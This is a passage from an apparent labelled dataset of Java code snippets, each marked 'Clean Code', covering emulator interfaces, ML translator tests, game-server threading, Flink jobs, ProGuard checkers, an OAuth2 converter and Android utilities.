  int JNILocalRefType=1;
  int JNIGlobalRefType=2;
  int JNIWeakGlobalRefType=3;
  Pointer getJavaVM();
  Pointer getJNIEnv();
  /** 
 * @param interfaceClasses 如果不为空的话，第一个为superClass，其它的为interfaces
 */
  DvmClass resolveClass(  String className,  DvmClass... interfaceClasses);
  DvmClass findClass(  String className);
  <T extends DvmObject<?>>T getObject(  int hash);
  /** 
 * Use vm.setDvmClassFactory(new ProxyClassFactory()) instead
 */
  void setJni(  Jni jni);
  void printMemoryInfo();
  DalvikModule loadLibrary(  String libname,  boolean forceCallInit);
  DalvikModule loadLibrary(  String libname,  byte[] raw,  boolean forceCallInit);
  DalvikModule loadLibrary(  File elfFile,  boolean forceCallInit);
  LibraryFile findLibrary(  String soName);
  int addLocalObject(  DvmObject<?> object);
  int addGlobalObject(  DvmObject<?> object);
  void callJNI_OnLoad(  Emulator<?> emulator,  Module module);
  /** 
 * 设置apkFile以后，可调用该值获取apk对应的packageName
 */
  String getPackageName();
  String getVersionName();
  long getVersionCode();
  /** 
 * 设置apkFile以后，可调用该方法获取资源文件
 * @return 可返回null
 */
  byte[] openAsset(  String fileName);
  /** 
 * 设置apkFile以后，可调用该方法获取压缩包内容
 * @return 可返回null
 */
  byte[] unzip(  String path);
  void setAssetResolver(  AssetResolver assetResolver);
  /** 
 * 设置apkFile以后，可调用该方法获取AndroidManifest.xml
 * @return 可返回null
 */
  String getManifestXml();
  /** 
 * Add not found class
 * @param className eg: sun/security/pkcs/PKCS7
 */
  void addNotFoundClass(  String className);
  /** 
 * VM throw exception
 */
  void throwException(  DvmObject<?> throwable);
  void setVerbose(  boolean verbose);
  void setVerboseMethodOperation(  boolean verboseMethodOperation);
  void setVerboseFieldOperation(  boolean verboseFieldOperation);
  void setDvmClassFactory(  DvmClassFactory factory);
  Emulator<?> getEmulator();
  CertificateMeta[] getSignatures();
}
",0,Clean Code
"public class FillMaskTranslatorTest {
  @Test public void testFillMaskTranslator() throws ModelException, IOException, TranslateException {
    String text=""Hello I'm a [MASK] model."";
    Block block=new LambdaBlock(a -> {
      NDManager manager=a.getManager();
      float[][] logits=new float[10][4828];
      logits[6][4827]=5;
      logits[6][2535]=4;
      logits[6][2047]=3;
      logits[6][3565]=2;
      logits[6][2986]=1;
      NDArray arr=manager.create(logits);
      arr=arr.expandDims(0);
      return new NDList(arr);
    }
,""model"");
    Path modelDir=Paths.get(""build/model"");
    Files.createDirectories(modelDir);
    Criteria<String,Classifications> criteria=Criteria.builder().setTypes(String.class,Classifications.class).optModelPath(modelDir).optBlock(block).optEngine(""PyTorch"").optArgument(""tokenizer"",""bert-base-uncased"").optOption(""hasParameter"",""false"").optTranslatorFactory(new FillMaskTranslatorFactory()).build();
    try (ZooModel<String,Classifications> model=criteria.loadModel();Predictor<String,Classifications> predictor=model.newPredictor()){
      Classifications res=predictor.predict(text);
      Assert.assertEquals(res.best().getClassName(),""fashion"");
      Assert.assertThrows(TranslateException.class,() -> predictor.predict(""Hello I'm a invalid model.""));
      Assert.assertThrows(TranslateException.class,() -> predictor.predict(""I'm a [MASK] [MASK] model.""));
    }
     Criteria<Input,Output> criteria2=Criteria.builder().setTypes(Input.class,Output.class).optModelPath(modelDir).optBlock(block).optEngine(""PyTorch"").optArgument(""tokenizer"",""bert-base-uncased"").optOption(""hasParameter"",""false"").optTranslatorFactory(new FillMaskTranslatorFactory()).build();
    try (ZooModel<Input,Output> model=criteria2.loadModel();Predictor<Input,Output> predictor=model.newPredictor()){
      Input input=new Input();
      input.add(text);
      Output out=predictor.predict(input);
      Classifications res=(Classifications)out.getData();
      Assert.assertEquals(res.best().getClassName(),""fashion"");
    }
     try (Model model=Model.newInstance(""test"")){
      model.setBlock(block);
      Map<String,String> options=new HashMap<>();
      options.put(""hasParameter"",""false"");
      model.load(modelDir,""test"",options);
      FillMaskTranslatorFactory factory=new FillMaskTranslatorFactory();
      Map<String,String> arguments=new HashMap<>();
      Assert.assertThrows(TranslateException.class,() -> factory.newInstance(String.class,Integer.class,model,arguments));
      arguments.put(""tokenizer"",""bert-base-uncased"");
      Assert.assertThrows(IllegalArgumentException.class,() -> factory.newInstance(String.class,Integer.class,model,arguments));
    }
   }
}
",0,Clean Code
"/** 
 * Thread responsible for ticking  {@link Chunk chunks} and {@link Entity entities}. <p> Created in  {@link ThreadDispatcher}, and awaken every tick with a task to execute.
 */
@ApiStatus.Internal public final class TickThread extends MinestomThread {
  private final ReentrantLock lock=new ReentrantLock();
  private volatile boolean stop;
  private CountDownLatch latch;
  private long tickTime;
  private long tickNum=0;
  private final List<ThreadDispatcher.Partition> entries=new ArrayList<>();
  public TickThread(  int number){
    super(MinecraftServer.THREAD_NAME_TICK + ""-"" + number);
  }
  public TickThread(  @NotNull String name){
    super(name);
  }
  public static @Nullable TickThread current(){
    if (Thread.currentThread() instanceof TickThread)     return current;
    return null;
  }
  @Override public void run(){
    LockSupport.park(this);
    while (!stop) {
      this.lock.lock();
      try {
        tick();
      }
 catch (      Exception e) {
        MinecraftServer.getExceptionManager().handleException(e);
      }
      this.lock.unlock();
      this.latch.countDown();
      LockSupport.park(this);
    }
  }
  private void tick(){
    final ReentrantLock lock=this.lock;
    final long tickTime=this.tickTime;
    for (    ThreadDispatcher.Partition entry : entries) {
      assert entry.thread() == this;
      final List<Tickable> elements=entry.elements();
      if (elements.isEmpty())       continue;
      for (      Tickable element : elements) {
        if (lock.hasQueuedThreads()) {
          lock.unlock();
          lock.lock();
        }
        try {
          element.tick(tickTime);
        }
 catch (        Throwable e) {
          MinecraftServer.getExceptionManager().handleException(e);
        }
      }
    }
  }
  void startTick(  CountDownLatch latch,  long tickTime){
    if (stop || entries.isEmpty()) {
      latch.countDown();
      return;
    }
    this.latch=latch;
    this.tickTime=tickTime;
    this.tickNum+=1;
    this.stop=false;
    LockSupport.unpark(this);
  }
  public Collection<ThreadDispatcher.Partition> entries(){
    return entries;
  }
  /** 
 * Gets the lock used to ensure the safety of entity acquisition.
 * @return the thread lock
 */
  public @NotNull ReentrantLock lock(){
    return lock;
  }
  public long getTick(){
    return tickNum;
  }
  void shutdown(){
    this.stop=true;
    LockSupport.unpark(this);
  }
}
",0,Clean Code
"public class CustomSelector implements ParticipantSelector.IParticipantSelection {
  public static final String CONFERENCE_PARTICIPANTS=""CONFERENCE_PARTICIPANTS"";
  public static final String SELECTED_PARTICIPANTS=""SELECTED_PARTICIPANTS"";
  private String mSelectActivityName="""";
  public CustomSelector(  String activityName){
    mSelectActivityName=activityName;
  }
  @Override public void startParticipantSelect(  Context context,  ConferenceParticipants participants,  ParticipantSelector.ParticipantSelectCallback participantSelectCallback){
    if (!(context instanceof ActivityResultCaller)) {
      return;
    }
    ActivityResultCaller caller=(ActivityResultCaller)context;
    Bundle param=new Bundle();
    param.putSerializable(CONFERENCE_PARTICIPANTS,participants);
    TUICore.startActivityForResult(caller,mSelectActivityName,param,result -> {
      if (result.getData() == null) {
        return;
      }
      List<ConferenceDefine.User> selectedParticipants=(List<ConferenceDefine.User>)result.getData().getSerializableExtra(SELECTED_PARTICIPANTS);
      if (selectedParticipants != null) {
        List<UserState.UserInfo> attendees=new ArrayList<>();
        for (        ConferenceDefine.User participant : selectedParticipants) {
          UserState.UserInfo userInfo=new UserState.UserInfo(participant.id);
          userInfo.userName=participant.name;
          userInfo.avatarUrl=participant.avatarUrl;
          attendees.add(userInfo);
        }
        participantSelectCallback.onParticipantSelected(attendees);
      }
    }
);
  }
}
",0,Clean Code
"/** 
 * @author XINZE
 */
public class TopNFunction extends ProcessAllWindowFunction<TopProductEntity,RankProductEntity,TimeWindow> {
  private int topSize=10;
  public TopNFunction(  int topSize){
    this.topSize=topSize;
  }
  @Override public void process(  Context context,  Iterable<TopProductEntity> iterable,  Collector<RankProductEntity> collector) throws Exception {
    PriorityQueue<TopProductEntity> res=new PriorityQueue<>(this.topSize,idComparator);
    for (    TopProductEntity topProductEntity : iterable) {
      res.add(topProductEntity);
    }
    int i=0;
    while (!res.isEmpty()) {
      TopProductEntity poll=res.poll();
      System.out.println(poll.getProductId() + "" :"" + poll.getActionTimes());
      RankProductEntity rankProductEntity=new RankProductEntity();
      rankProductEntity.setId(String.valueOf(i++));
      rankProductEntity.setProductId(String.valueOf(poll.getProductId()));
      collector.collect(rankProductEntity);
    }
  }
  private static Comparator<TopProductEntity> idComparator=new Comparator<TopProductEntity>(){
    @Override public int compare(    TopProductEntity c1,    TopProductEntity c2){
      return c1.getProductId() - c2.getProductId();
    }
  }
;
}
",0,Clean Code
"/** 
 * mock state machine that fails to load snapshot.
 * @author boyan (boyan@alibaba-inc.com)2018-Apr-23 11:45:29 AM
 */
static class MockFSM1 extends MockStateMachine {
  public MockFSM1(){
    this(new Endpoint(Utils.IP_ANY,0));
  }
  public MockFSM1(  final Endpoint address){
    super(address);
  }
  @Override public boolean onSnapshotLoad(  final SnapshotReader reader){
    return false;
  }
}
/** 
 * mock state machine that fails to load snapshot.
 * @author boyan (boyan@alibaba-inc.com)2018-Apr-23 11:45:29 AM
 */
static class MockFSM1 extends MockStateMachine {
  public MockFSM1(){
    this(new Endpoint(Utils.IP_ANY,0));
  }
  public MockFSM1(  final Endpoint address){
    super(address);
  }
  @Override public boolean onSnapshotLoad(  final SnapshotReader reader){
    return false;
  }
}",0,Clean Code
"/** 
 * Desc: Configuration store the config Created by zhisheng on 2019/10/9 下午8:13 blog：http://www.54tianzhisheng.cn/ 微信公众号：zhisheng
 */
public class ConfigurationMain1 {
  public static void main(  String[] args) throws Exception {
    ExecutionEnvironment env=ExecutionEnvironment.getExecutionEnvironment();
    Configuration configuration=new Configuration();
    configuration.setString(""name"",""zhisheng"");
    env.fromElements(WORDS).flatMap(new RichFlatMapFunction<String,Tuple2<String,Integer>>(){
      String name;
      @Override public void open(      Configuration parameters) throws Exception {
        name=parameters.getString(""name"","""");
        super.open(parameters);
      }
      @Override public void flatMap(      String value,      Collector<Tuple2<String,Integer>> out) throws Exception {
        String[] splits=value.toLowerCase().split(""\\W+"");
        for (        String split : splits) {
          if (split.length() > 0) {
            out.collect(new Tuple2<>(split + name,1));
          }
        }
      }
    }
).withParameters(configuration).filter(new RichFilterFunction<Tuple2<String,Integer>>(){
      private String name;
      @Override public void open(      Configuration parameters) throws Exception {
        name=parameters.getString(""name"","""");
        System.out.println(""====================="" + name);
      }
      @Override public boolean filter(      Tuple2<String,Integer> tuple2) throws Exception {
        return !tuple2.f0.contains(name);
      }
    }
).withParameters(configuration).print();
  }
  private static final String[] WORDS=new String[]{""To be, or not to be,--that is the question:--"",""Whether 'tis nobler in the mind to suffer"",""The slings and arrows of outrageous fortune"",""Or to take arms against a sea of troubles,"",""And by opposing end them?--To die,--to sleep,--"",""No more; and by a sleep to say we end"",""The heartache, and the thousand natural shocks"",""That flesh is heir to,--'tis a consummation"",""Devoutly to be wish'd. To die,--to sleep;--"",""To sleep! perchance to dream:--ay, there's the rub;"",""For in that sleep of death what dreams may come,"",""When we have shuffled off this mortal coil,"",""Must give us pause: there's the respect"",""That makes calamity of so long life;"",""For who would bear the whips and scorns of time,"",""The oppressor's wrong, the proud man's contumely,"",""The pangs of despis'd love, the law's delay,"",""The insolence of office, and the spurns"",""That patient merit of the unworthy takes,"",""When he himself might his quietus make"",""With a bare bodkin? who would these fardels bear,"",""To grunt and sweat under a weary life,"",""But that the dread of something after death,--"",""The undiscover'd country, from whose bourn"",""No traveller returns,--puzzles the will,"",""And makes us rather bear those ills we have"",""Than fly to others that we know not of?"",""Thus conscience does make cowards of us all;"",""And thus the native hue of resolution"",""Is sicklied o'er with the pale cast of thought;"",""And enterprises of great pith and moment,"",""With this regard, their currents turn awry,"",""And lose the name of action.--Soft you now!"",""The fair Ophelia!--Nymph, in thy orisons"",""Be all my sins remember'd.""};
}
",0,Clean Code
"private class Job extends BytesJob {
  private Job(){
    super(id,handler,future);
  }
  @Override protected byte[] getBytes() throws Exception {
    VirtualMachineUtil.VMConnector connect=VirtualMachineUtil.connect(pid);
    MxBean mxBean=new MxBean(getCounters(pid),connect.getRuntimeMXBean(),connect.getOperatingSystemMXBean(),connect.getMemoryMXBean(),connect.getThreadMXBean(),connect.getClassLoadingMXBean(),connect.getGarbageCollectorMXBeans(),connect.getMemoryPoolMXBeans());
    Map<String,Object> result=new HashMap<>();
    result.put(""type"",""hostInfo"");
    result.put(""jvm"",getJvmInfo(mxBean));
    result.put(""host"",getHostInfo(mxBean));
    result.put(""memPool"",getMemoryPoolMXBeansInfo(mxBean.getMemoryPoolMXBeans()));
    result.put(""visuaGC"",getVisuaGCInfo(mxBean.getCounters()));
    return JacksonSerializer.serializeToBytes(result);
  }
  @Override public ListeningExecutorService getExecutor(){
    return AgentRemotingExecutor.getExecutor();
  }
}
private class Job extends BytesJob {
  private Job(){
    super(id,handler,future);
  }
  @Override protected byte[] getBytes() throws Exception {
    VirtualMachineUtil.VMConnector connect=VirtualMachineUtil.connect(pid);
    Map<String,Object> result=new HashMap<>();
    if (ALL_THREADS_INFO == commandType) {
      result.put(TYPE,""allThreadInfo"");
      List<ThreadBrief> threads=getAllThreadsInfo(connect,result);
      result.put(THREADS,threads);
    }
 else     if (THREAD_DETAIL == commandType) {
      result.put(TYPE,""threadDetail"");
      ThreadInfo threadInfo=getThreadInfo(connect,result);
      result.put(THREAD,threadInfo);
    }
 else     if (DUMP_THREADS == commandType) {
      result.put(TYPE,""threadDump"");
      ThreadInfo[] threads=dump(connect,maxDepth,false);
      result.put(THREADS,threads);
    }
 else     if (DEADLOCK_THREAD == commandType) {
      result.put(TYPE,""threadDeadLock"");
      ThreadInfo[] threads=dump(connect,maxDepth,true);
      result.put(THREADS,threads);
    }
    return JacksonSerializer.serializeToBytes(result);
  }
  @Override public ListeningExecutorService getExecutor(){
    return AgentRemotingExecutor.getExecutor();
  }
}
",0,Clean Code
"public class FileUtils {
  private static String[] PERMISSIONS_STORAGE={Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE};
  public static boolean isFilePermissionGranted(  Context context){
    int pid=android.os.Process.myPid();
    int uid=Process.myUid();
    return context.checkPermission(PERMISSIONS_STORAGE[0],pid,uid) == PackageManager.PERMISSION_GRANTED && context.checkPermission(PERMISSIONS_STORAGE[1],pid,uid) == PackageManager.PERMISSION_GRANTED;
  }
  public static String readTextFromAssets(  Context context,  String assetsFileName){
    if (context == null) {
      return null;
    }
    try {
      InputStream is=context.getAssets().open(assetsFileName);
      return readTextFromInputStream(is);
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
    return null;
  }
  public static String readTextFromInputStream(  InputStream is){
    InputStreamReader reader=null;
    BufferedReader bufferedReader=null;
    try {
      reader=new InputStreamReader(is,""UTF-8"");
      bufferedReader=new BufferedReader(reader);
      StringBuilder builder=new StringBuilder();
      String str;
      while ((str=bufferedReader.readLine()) != null) {
        builder.append(str);
      }
      return builder.toString();
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
 finally {
      closeSafely(reader);
      closeSafely(bufferedReader);
    }
    return null;
  }
  private static void closeSafely(  Closeable closeable){
    try {
      if (closeable != null) {
        closeable.close();
      }
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
}
",0,Clean Code
"public class FragmentAdapter extends FragmentStateAdapter {
  private static final String TAG=FragmentAdapter.class.getSimpleName();
  private List<Fragment> fragmentList;
  public FragmentAdapter(  @NonNull FragmentActivity fragmentActivity){
    super(fragmentActivity);
  }
  public FragmentAdapter(  @NonNull Fragment fragment){
    super(fragment);
  }
  public FragmentAdapter(  @NonNull FragmentManager fragmentManager,  @NonNull Lifecycle lifecycle){
    super(fragmentManager,lifecycle);
  }
  public void setFragmentList(  List<Fragment> fragmentList){
    this.fragmentList=fragmentList;
  }
  @NonNull @Override public Fragment createFragment(  int position){
    if (fragmentList == null || fragmentList.size() <= position) {
      return new Fragment();
    }
    return fragmentList.get(position);
  }
  @Override public int getItemCount(){
    return fragmentList == null ? 0 : fragmentList.size();
  }
  @Override public long getItemId(  int position){
    return fragmentList.get(position).hashCode();
  }
  @Override public boolean containsItem(  long itemId){
    for (    Fragment fragment : fragmentList) {
      if (fragment.hashCode() == itemId) {
        return true;
      }
    }
    return false;
  }
}
",0,Clean Code
"/** 
 * This class checks whether some keep rules only keep library classes, no program classes. That is strange, because library classes never need to be kept explicitly.
 * @author Eric Lafortune
 */
public class LibraryKeepChecker implements ClassVisitor {
  private final ClassPool programClassPool;
  private final ClassPool libraryClassPool;
  private final WarningPrinter notePrinter;
  private String keepName;
  /** 
 * Creates a new DescriptorKeepChecker.
 */
  public LibraryKeepChecker(  ClassPool programClassPool,  ClassPool libraryClassPool,  WarningPrinter notePrinter){
    this.programClassPool=programClassPool;
    this.libraryClassPool=libraryClassPool;
    this.notePrinter=notePrinter;
  }
  /** 
 * Checks the classes mentioned in the given keep specifications, printing notes if necessary.
 */
  public void checkClassSpecifications(  List keepSpecifications){
    if (keepSpecifications != null) {
      for (int index=0; index < keepSpecifications.size(); index++) {
        KeepClassSpecification keepClassSpecification=(KeepClassSpecification)keepSpecifications.get(index);
        keepName=keepClassSpecification.className;
        if (keepName != null) {
          KeepClassSpecificationVisitorFactory visitorFactory=new KeepClassSpecificationVisitorFactory(true,true,true);
          ClassCounter programClassCounter=new ClassCounter();
          programClassPool.accept(visitorFactory.createClassPoolVisitor(keepClassSpecification,programClassCounter,null,null,null));
          if (programClassCounter.getCount() == 0) {
            libraryClassPool.accept(visitorFactory.createClassPoolVisitor(keepClassSpecification,this,null,null,null));
          }
        }
      }
    }
  }
  @Override public void visitAnyClass(  Clazz clazz){
  }
  @Override public void visitLibraryClass(  LibraryClass libraryClass){
    String className=libraryClass.getName();
    notePrinter.print(className,""Note: the configuration explicitly specifies '"" + ClassUtil.externalClassName(keepName) + ""' to keep library class '""+ ClassUtil.externalClassName(className)+ ""'"");
  }
}",0,Clean Code
"/** 
 * Termux app core activity.
 */
public static final class TERMUX_ACTIVITY {
  /** 
 * Intent extra for if termux failsafe session needs to be started and is used by  {@link TERMUX_ACTIVITY} and {@link TERMUX_SERVICE#ACTION_STOP_SERVICE} 
 */
  public static final String EXTRA_FAILSAFE_SESSION=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.failsafe_session"";
  /** 
 * Intent action to make termux app notify user that a crash happened. 
 */
  public static final String ACTION_NOTIFY_APP_CRASH=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.notify_app_crash"";
  /** 
 * Intent action to make termux reload its termux session styling 
 */
  public static final String ACTION_RELOAD_STYLE=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.reload_style"";
  /** 
 * Intent  {@code String} extra for what to reload for the TERMUX_ACTIVITY.ACTION_RELOAD_STYLE intent. This has been deperecated. 
 */
  @Deprecated public static final String EXTRA_RELOAD_STYLE=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.reload_style"";
  /** 
 * Intent  {@code boolean} extra for whether to recreate activity for the TERMUX_ACTIVITY.ACTION_RELOAD_STYLE intent. 
 */
  public static final String EXTRA_RECREATE_ACTIVITY=TERMUX_APP.TERMUX_ACTIVITY_NAME + "".EXTRA_RECREATE_ACTIVITY"";
  /** 
 * Intent action to make termux request storage permissions 
 */
  public static final String ACTION_REQUEST_PERMISSIONS=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.request_storage_permissions"";
}
",0,Clean Code
"/** 
 * A class responsible to create  {@link HdfsRepository} instances. 
 */
public class HdfsRepositoryFactory implements RepositoryFactory {
  private Configuration config;
  /** 
 * Creates an  {@code HdfsRepositoryFactory} instance with default {@code Configuration}. 
 */
  public HdfsRepositoryFactory(){
    this(new Configuration());
  }
  /** 
 * Creates an  {@code HdfsRepositoryFactory} instance with the specified {@code Configuration}.
 * @param config the {@code Configuration}
 */
  public HdfsRepositoryFactory(  Configuration config){
    this.config=config;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Repository newInstance(  String name,  URI uri){
    String scheme=uri.getScheme();
    if (!""hdfs"".equalsIgnoreCase(scheme)) {
      throw new IllegalArgumentException(""Invalid hdfs url: "" + uri);
    }
    return new HdfsRepository(name,uri,config);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Set<String> getSupportedScheme(){
    return Collections.singleton(""hdfs"");
  }
}
",0,Clean Code
"/** 
 * {@link FactoriesCodeContributor} ignoring Spring Factories that are now handledduring the bootstrap code generation process.
 * @see BootstrapCodeGenerator
 */
class IgnoredFactoriesCodeContributor implements FactoriesCodeContributor {
  private static final Predicate<SpringFactory> IGNORED_FACTORY_PACKAGES=factoriesInPackages(""org.springframework.aot.context.bootstrap"",""org.springframework.aot.context.origin"",""org.springframework.aot.test.context.bootstrap"");
  private static final Predicate<SpringFactory> IGNORED_FACTORY_TYPES=factoryTypes(""org.springframework.boot.ApplicationContextFactory"",""org.springframework.boot.autoconfigure.AutoConfigurationImportListener"",""org.springframework.boot.autoconfigure.AutoConfigurationImportFilter"",""org.springframework.boot.autoconfigure.EnableAutoConfiguration"",""org.springframework.context.annotation.BeanDefinitionPostProcessor"",""org.springframework.nativex.type.NativeConfiguration"",""org.springframework.aot.build.BootstrapContributor"");
  private static final Predicate<SpringFactory> CONTEXT_CUSTOMIZER_FACTORY=factoryEntry(""org.springframework.test.context.ContextCustomizerFactory"",""org.springframework.boot.test.autoconfigure.OverrideAutoConfigurationContextCustomizerFactory"",""org.springframework.boot.test.autoconfigure.filter.TypeExcludeFiltersContextCustomizerFactory"",""org.springframework.boot.test.context.ImportsContextCustomizerFactory"");
  private static final Predicate<SpringFactory> IGNORED_TEST_EXECUTION_LISTENERS=factoryEntry(""org.springframework.test.context.TestExecutionListener"",""org.springframework.boot.test.mock.mockito.MockitoTestExecutionListener"",""org.springframework.boot.test.mock.mockito.ResetMocksTestExecutionListener"");
  private final Log logger=LogFactory.getLog(IgnoredFactoriesCodeContributor.class);
  @Override public boolean canContribute(  SpringFactory factory){
    return IGNORED_FACTORY_PACKAGES.or(IGNORED_FACTORY_TYPES).or(CONTEXT_CUSTOMIZER_FACTORY).or(IGNORED_TEST_EXECUTION_LISTENERS).test(factory);
  }
  @Override public void contribute(  SpringFactory factory,  CodeGenerator code,  BuildContext context){
    logger.debug(""Skip build time factory Type:"" + factory.getFactory().getName());
  }
  private static Predicate<SpringFactory> factoryTypes(  String... factoryTypes){
    Set<String> candidates=new HashSet<>(Arrays.asList(factoryTypes));
    return (springFactory) -> candidates.contains(springFactory.getFactoryType().getName());
  }
  private static Predicate<SpringFactory> factoriesInPackages(  String... packageNames){
    return (springFactory) -> {
      for (      String packageName : packageNames) {
        if (springFactory.getFactoryType().getName().startsWith(packageName)) {
          return true;
        }
      }
      return false;
    }
;
  }
  private static Predicate<SpringFactory> factoryEntry(  String factoryType,  String... factoryImplementations){
    Set<String> candidateImplementations=new HashSet<>(Arrays.asList(factoryImplementations));
    return factoryTypes(factoryType).and((springFactory) -> candidateImplementations.contains(springFactory.getFactory().getName()));
  }
}
",0,Clean Code
"public class ByteArrayFileIO extends BaseAndroidFileIO {
  private static final Logger log=LoggerFactory.getLogger(ByteArrayFileIO.class);
  protected final byte[] bytes;
  protected final String path;
  public ByteArrayFileIO(  int oflags,  String path,  byte[] bytes){
    super(oflags);
    this.path=path;
    this.bytes=bytes;
  }
  private int pos;
  @Override public void close(){
    pos=0;
  }
  @Override public int write(  byte[] data){
    throw new UnsupportedOperationException();
  }
  @Override public int pread(  Backend backend,  Pointer buffer,  int count,  long offset){
    int pos=this.pos;
    try {
      this.pos=(int)offset;
      return read(backend,buffer,count);
    }
  finally {
      this.pos=pos;
    }
  }
  @Override public int read(  Backend backend,  Pointer buffer,  int count){
    if (pos >= bytes.length) {
      return 0;
    }
    int remain=bytes.length - pos;
    if (count > remain) {
      count=remain;
    }
    buffer.write(0,bytes,pos,count);
    if (log.isDebugEnabled()) {
      log.debug(Inspector.inspectString(Arrays.copyOfRange(bytes,pos,pos + count),""read path="" + path + "", fp=""+ pos+ "", _count=""+ count+ "", length=""+ bytes.length+ "", buffer=""+ buffer));
    }
    pos+=count;
    return count;
  }
  @Override public int lseek(  int offset,  int whence){
switch (whence) {
case SEEK_SET:
      pos=offset;
    return pos;
case SEEK_CUR:
  pos+=offset;
return pos;
case SEEK_END:
pos=bytes.length + offset;
return pos;
}
return super.lseek(offset,whence);
}
@Override public int fstat(Emulator<?> emulator,StatStructure stat){
stat.st_dev=1;
stat.st_mode=IO.S_IFREG;
stat.st_uid=0;
stat.st_gid=0;
stat.st_size=bytes.length;
stat.st_blksize=emulator.getPageAlign();
stat.st_blocks=((bytes.length + emulator.getPageAlign() - 1) / emulator.getPageAlign());
stat.st_ino=1;
stat.setLastModification(System.currentTimeMillis());
stat.pack();
return 0;
}
@Override protected byte[] getMmapData(long addr,int offset,int length){
if (offset == 0 && length == bytes.length) {
return bytes;
}
 else {
byte[] data=new byte[length];
System.arraycopy(bytes,offset,data,0,data.length);
return data;
}
}
@Override public int ioctl(Emulator<?> emulator,long request,long argp){
return 0;
}
@Override public String toString(){
return path;
}
@Override public int ftruncate(int length){
return 0;
}
}
",0,Clean Code
"/** 
 * @author jumuning
 * @date 2022-06-02自定义模式认证转换器
 */
public abstract class OAuth2ResourceOwnerBaseAuthenticationConverter<T extends OAuth2ResourceOwnerBaseAuthenticationToken> implements AuthenticationConverter {
  /** 
 * 是否支持此convert
 * @param grantType 授权类型
 * @return
 */
  public abstract boolean support(  String grantType);
  /** 
 * 校验参数
 * @param request 请求
 */
  public void checkParams(  HttpServletRequest request){
  }
  /** 
 * 构建具体类型的token
 * @param clientPrincipal
 * @param requestedScopes
 * @param additionalParameters
 * @return
 */
  public abstract T buildToken(  Authentication clientPrincipal,  Set<String> requestedScopes,  Map<String,Object> additionalParameters);
  @Override public Authentication convert(  HttpServletRequest request){
    String grantType=request.getParameter(OAuth2ParameterNames.GRANT_TYPE);
    if (!support(grantType)) {
      return null;
    }
    MultiValueMap<String,String> parameters=OAuth2EndpointUtils.getParameters(request);
    String scope=parameters.getFirst(OAuth2ParameterNames.SCOPE);
    if (StringUtils.hasText(scope) && parameters.get(OAuth2ParameterNames.SCOPE).size() != 1) {
      OAuth2EndpointUtils.throwError(OAuth2ErrorCodes.INVALID_REQUEST,OAuth2ParameterNames.SCOPE,OAuth2EndpointUtils.ACCESS_TOKEN_REQUEST_ERROR_URI);
    }
    Set<String> requestedScopes=null;
    if (StringUtils.hasText(scope)) {
      requestedScopes=new HashSet<>(Arrays.asList(StringUtils.delimitedListToStringArray(scope,"" "")));
    }
    checkParams(request);
    Authentication clientPrincipal=SecurityContextHolder.getContext().getAuthentication();
    if (clientPrincipal == null) {
      OAuth2EndpointUtils.throwError(OAuth2ErrorCodes.INVALID_REQUEST,OAuth2ErrorCodes.INVALID_CLIENT,OAuth2EndpointUtils.ACCESS_TOKEN_REQUEST_ERROR_URI);
    }
    Map<String,Object> additionalParameters=parameters.entrySet().stream().filter(e -> !e.getKey().equals(OAuth2ParameterNames.GRANT_TYPE) && !e.getKey().equals(OAuth2ParameterNames.SCOPE)).collect(Collectors.toMap(Map.Entry::getKey,e -> e.getValue().get(0)));
    return buildToken(clientPrincipal,requestedScopes,additionalParameters);
  }
}
",0,Clean Code
"public class TestPane extends JPanel {
  private final JTable statusTable;
  public TestPane(){
    statusTable=new javax.swing.JTable();
    statusTable.setRowHeight(200);
    statusTable.setModel(new javax.swing.table.DefaultTableModel(new Object[][]{},new String[]{""Icons"",""Message""}){
      Class[] types=new Class[]{javax.swing.ImageIcon.class,java.lang.String.class};
      boolean[] canEdit=new boolean[]{false,false};
      public Class getColumnClass(      int columnIndex){
        return types[columnIndex];
      }
      public boolean isCellEditable(      int rowIndex,      int columnIndex){
        return canEdit[columnIndex];
      }
    }
);
    setLayout(new BorderLayout());
    add(new JScrollPane(statusTable));
    JButton add=new JButton(""Add"");
    add(add,BorderLayout.SOUTH);
    add.addActionListener(new ActionListener(){
      @Override public void actionPerformed(      ActionEvent e){
        DefaultTableModel model=(DefaultTableModel)statusTable.getModel();
        Object[] row=new Object[2];
        ImageIcon icon=new ImageIcon(""C:/1.png"");
        row[0]=icon;
        row[1]=""Boo"";
        model.addRow(row);
      }
    }
);
  }
}
",0,Clean Code
"/** 
 * This class checks if the user is specifying to assume no side effects for a reasonable number of methods in a class: not none and not all.
 * @author Eric Lafortune
 */
public class AssumeNoSideEffectsChecker {
  private final WarningPrinter notePrinter;
  /** 
 * Creates a new KeepClassMemberChecker.
 */
  public AssumeNoSideEffectsChecker(  WarningPrinter notePrinter){
    this.notePrinter=notePrinter;
  }
  /** 
 * Checks if the given class specifications try to assume no side effects for all methods in a class, printing notes if necessary.
 */
  public void checkClassSpecifications(  List classSpecifications){
    if (classSpecifications != null) {
      for (int classSpecificationIndex=0; classSpecificationIndex < classSpecifications.size(); classSpecificationIndex++) {
        ClassSpecification classSpecification=(ClassSpecification)classSpecifications.get(classSpecificationIndex);
        String className=classSpecification.className;
        if (className == null) {
          className=classSpecification.extendsClassName;
        }
        if (className == null || notePrinter.accepts(className)) {
          List methodSpecifications=classSpecification.methodSpecifications;
          if (methodSpecifications != null) {
            for (int methodSpecificationIndex=0; methodSpecificationIndex < methodSpecifications.size(); methodSpecificationIndex++) {
              final MemberSpecification methodSpecification=(MemberSpecification)methodSpecifications.get(methodSpecificationIndex);
              if (methodSpecification.name == null && methodSpecification.descriptor == null) {
                notePrinter.print(className == null ? ConfigurationConstants.ANY_CLASS_KEYWORD : className,""Note: the configuration specifies that none of the methods of class '"" + (className == null ? ConfigurationConstants.ANY_CLASS_KEYWORD : ClassUtil.externalClassName(className)) + ""' have any side effects"");
              }
            }
          }
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * Represents the  {@link Player} tab list as a {@link Scoreboard}.
